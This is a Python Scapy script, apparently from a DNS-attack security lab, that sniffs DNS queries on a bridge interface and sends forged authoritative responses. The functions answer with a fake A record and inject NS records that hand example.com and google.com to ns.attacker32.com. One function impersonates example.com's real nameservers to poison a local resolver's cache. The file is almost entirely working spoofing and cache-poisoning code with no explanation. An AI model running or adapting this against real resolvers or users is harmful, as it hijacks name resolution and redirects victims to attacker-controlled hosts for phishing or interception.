#!/usr/bin/env python3
from scapy.all import *
import time

def spoof_user(pkt):
  if (DNS in pkt and 'example.com' in pkt[DNS].qd.qname.decode('utf-8')):

    # Swap the source and destination IP address
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.0.2.5')
    NSsec1 = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.attacker32.com')
    NSsec2 = DNSRR(rrname='google.com', type='NS', ttl=259200, rdata='ns.attacker32.com')
    Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A', ttl=259200, rdata='1.2.3.4')
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  qdcount=1, ancount=1, 
    nscount=2, arcount=1, an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1)
    
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)

def spoof_dns(pkt):
  if (pkt[IP].dst == "199.43.133.53" or pkt[IP].dst == "199.43.135.53") and pkt[IP].src == "10.9.0.53" \
  and 'example.com' in pkt[DNS].qd.qname.decode('utf-8'):
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.0.2.5')
    NSsec1 = DNSRR(rrname='example.com', type='NS', ttl=259200, rdata='ns.attacker32.com')
    NSsec2 = DNSRR(rrname='google.com', type='NS', ttl=259200, rdata='ns.attacker32.com')
    Addsec1 = DNSRR(rrname='ns.attacker32.com', type='A', ttl=259200, rdata='1.2.3.4')
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  qdcount=1, ancount=1, 
    nscount=2, arcount=1, an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1)
    
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)
    

def sniff_nameserver(pkt):
    if (pkt[IP].src == "10.9.0.53" and DNS in pkt
    and 'www.example.net' in pkt[DNS].qd.qname.decode('utf-8')):
        print("IP DST:		", pkt[IP].dst)
        
def spoof_both(pkt):
  if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname.decode('utf-8')):
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='10.0.2.5')
    NSsec1 = DNSRR(rrname='example.net', type='NS',
                   ttl=259200, rdata='ns1.example.net')
    NSsec2 = DNSRR(rrname='example.net', type='NS',
                   ttl=259200, rdata='ns2.example.net')
    Addsec1 = DNSRR(rrname='ns1.example.net', type='A',
                    ttl=259200, rdata='1.2.3.4')
    Addsec2 = DNSRR(rrname='ns2.example.net', type='A',
                    ttl=259200, rdata='5.6.7.8')
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=2,an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)

    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)
    
   
    
    

        
# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and dst port 53'
pkt = sniff(iface='br-5300c4e9b79b', filter=f, prn=spoof_user)      
